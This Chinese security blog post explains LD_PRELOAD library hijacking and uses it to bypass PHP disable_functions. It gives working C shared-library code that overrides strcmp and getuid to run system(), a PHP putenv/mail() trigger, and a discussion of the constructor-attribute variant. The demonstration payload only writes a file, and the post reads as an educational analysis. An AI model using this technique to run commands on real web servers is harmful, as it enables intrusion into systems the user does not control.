---
title: "利用LD_PRELOAD绕过disable_function"
date: 2021-05-03T10:24:32+08:00
---

## 什么是LD_PRELOAD

在**Linux**的动态链接库的世界中，**LD_PRELOAD**是一个环境变量，它可以影响程序的运行时的链接（Runtime linker），允许你定义在程序运行前优先加载的动态链接库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。

这里我们举行一个密码验证的例子，来初步探究**LD_PRELOAD**与动态链接的关系。

```c
/* login.c */
#include <stdio.h>
#include<string.h>
int main(int argc,char **argv){
    char passwd[]="password";
    if(!strcmp(passwd,argv[1])){
        printf("Correct Password!/n");
        return 1;
    }
    printf("Invalid Password!/n");
    return 0;
}
```

在上面这段程序中，我们使用了strcmp函数来判断两个字符串是否相等。下面，我们使用一个动态函数库来重载strcmp函数：

```c
/* hack.c */
#include "stdio.h"
#include <string.h>
int strcmp(const char *s1,const char *s2){
    printf("hacking! s1=%s,s2=%s\n",s1,s2);
    // return 0 indicates that 2 strings are equial 
    return 0 ;
}
```
编译程序：
 ```bash
☁  c  gcc login.c -o login
☁  c  gcc -shared hack.c -o hack.so
 ```

运行一下:

```bash
☁  c  ./login 123456
Invalid Password!/n% 
```

设置**LD_PRELOAD**变量:(使我们重写过的strcmp函数的hack.so成为优先载入链接库)，再重新运行

```bash
☁  c  export LD_PRELOAD="./hack.so"
☁  c  ./login 123456
hacking! s1=password,s2=123456
Correct Password!/n%
```

可以看到：

1. 我们的hack.so中的ctramp被调用了。
2. 主程序中的运行结果被影响了。

## 绕过disable_function

设想这样一种思路:

	利用web漏洞启动一个新进程a.bin
	a.bin内部调用系统函数b(),b()位于系统共享对象c.so中
	我们创建c_evil.so，c_evil.so含有与b()中同名的恶意函数，同时把利用web漏洞将c_evil.so加载到环境变量中
	由于c_evil.so优先级最高，所以a.bin将调用c_evil.so中的b()，达到命令执行。

根据上面的思路，我们需要web漏洞环境满足以下几种条件：

1. 具有可写入目录,用于上传.so文件
2. 能够控制**LD_PRELOAD**环境变量的值，例如**putenv()** 函数。
3. 函数调用的新进程需要加载.so文件。

在第三点中，经过测试`mail()`、`imap_mail()`、`mb_send_mail()`、`error_log()`均可以调用外部新进程，这里我们拿`mail()`作为研究对象。

```php
<?php
mail("","","","","");
?>
```
**strace**命令可以用于跟踪api调用情况

```bash
☁  ~  strace -f php mail.php 2>&1 | grep -A2 -B2 execve
sh: 1: /usr/sbin/sendmail: not found
```

发现确实调用了外部进程..但我没有下载...下载后:

![image-20210503141852067](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-03-image-20210503141852067.png)

我们再跟进看一看**sendmail**：

```bash
☁  ~  readelf -Ws /usr/sbin/sendmail
Symbol table '.dynsym' contains 347 entries:
   Num:    Value          Size Type    Bind   Vis      Ndx Name
     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND sasl_server_init@SASL2 (2)
     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND DH_size@OPENSSL_1_1_0 (3)
     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND X509_STORE_set_flags@OPENSSL_1_1_0 (3)
     4: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND wait@GLIBC_2.2.5 (4)
     5: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND X509_STORE_add_crl@OPENSSL_1_1_0 (3)
     6: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND SSL_CTX_load_verify_locations@OPENSSL_1_1_0 (5)
     7: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND SSL_CTX_set_client_CA_list@OPENSSL_1_1_0 (5)
     8: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND ERR_reason_error_string@OPENSSL_1_1_0 (3)
     9: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND DSA_generate_parameters_ex@OPENSSL_1_1_0 (3)
    10: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND getuid@GLIBC_2.2.5 (4)
    11: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND getsockname@GLIBC_2.2.5 (4)
    12: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __res_state@GLIBC_2.2.5 (4)
    13: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND uname@GLIBC_2.2.5 (4)
    14: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND BN_new@OPENSSL_1_1_0 (3)
    15: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND select@GLIBC_2.2.5 (4)
    16: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND RSA_new@OPENSSL_1_1_0 (3)
    17: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND memcpy@GLIBC_2.14 (6)
    ...
	...
```

在若干库函数中，我们选择**getuid**作为研究对象。

```c
/* hack.c*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void hack(){
    system("echo theoyu > result");
}

int getuid(){
    unsetenv("LD_PRELOAD");
    hack();
}
```

编译:

```bash
☁  demo  gcc -shared hack.c -o hack.so
```

php：

```php
<?php
putenv("LD_PRELOAD=/home/theoyu/demo/hack.so");
mail("","","","","");
?>
```

执行:

```bash
☁  demo  php mail.php
☁  demo  cat result 
theoyu
```

可以看到我们没有利用任何PHP 的 命令执行函数（system()、exec() 等等）仍可执行系统命令的目的。

但很明显可以看到一点，在真实情况下，肉鸡不一定安装了**sendmail**，我们也不可能通过www-data用户去让其安装，基于这点，[yangyangwithgnu](https://www.freebuf.com/web/192052.html)师傅发现了一个可以**加载时就执行代码**的方法，进而达到命令执行的效果。

## 一个误区

在[yangyangwithgnu](https://github.com/yangyangwithgnu)的文章中，是这样写到的：

	回到 LD_PRELOAD 本身，系统通过它预先加载共享对象，如果能找到一个方式，在加载时就执行代码，
	而不用考虑劫持某一系统函数，那我就完全可以不依赖 sendmail 了。这种场景与 C++ 的构造函数
	简直神似！几经搜索后了解，GCC 有个 C 语言扩展修饰符 __attribute__((constructor))，
	可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加
	载，立即将执行 __attribute__((constructor)) 修饰的函数。强调下，这一细节非常重要，很多
	朋友用LD_PRELOAD 手法突破 disable_functions 无法做到百分百成功，正因为这个原因，我们不
	要局限于仅劫持某一函数，而应考虑劫持共享对象。


按照这篇文章的说法，我们只需利用`putenv`设置`LD_PRELOAD` ，使得使用了`__attribute__((constructor))`修饰函数的恶意动态链接库被系统加载便能实现命令执行，而不再需要再去劫持程序调用的库函数，`sendmail` 存不存在也就无所谓了。

然而我们的这个恶意动态链接库（共享对象）究竟是怎么被 “系统” 加载的呢？文章中没有说的很清楚，也可能是我对于程序的链接、装载这一块确实不了解，所以我打算动手实践一下。

但是一个不可思议的结果发生了... 我手动把**sendmail** 删除后，不小心又重新运行了一次`php mail.php`,**result** 命令执行居然还是成功了。

```bash
☁  demo  php mail.php 
sh: 1: /usr/sbin/sendmail: not found
☁  demo  cat result 
theoyu
```

这我不太能接受，如果sendmail根本不需要的话，那文章的后大篇幅关于**__attribute__((constructor))**的讲解也是没有太大意义的，我们回头看看`strace -f php mail.php 2>&1 | grep -A2 -B2 execve`

![image-20210503160144193](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-03-image-20210503160144193.png)

事实上，顺着作者的思路，我们居然把**/bin/sh**这个调用进程所忽略了，也就是说在这一步，真正加载了动态链接库的其实是`/bin/sh` 的进程，其实我们大可不必使用`__attribute__((constructor))` ，直接劫持`/bin/sh` 的库函数即可,方法与**sendmail** 一致。可以说用`__attribute__((constructor))` ，只是为我们免去了挑选库函数的一步而已。

## 参考
- [深入浅出LD_PRELOAD & putenv()](https://www.anquanke.com/post/id/175403#h2-1)
- [无需sendmail：巧用LD_PRELOAD突破disable_functions](https://www.freebuf.com/web/192052.html)


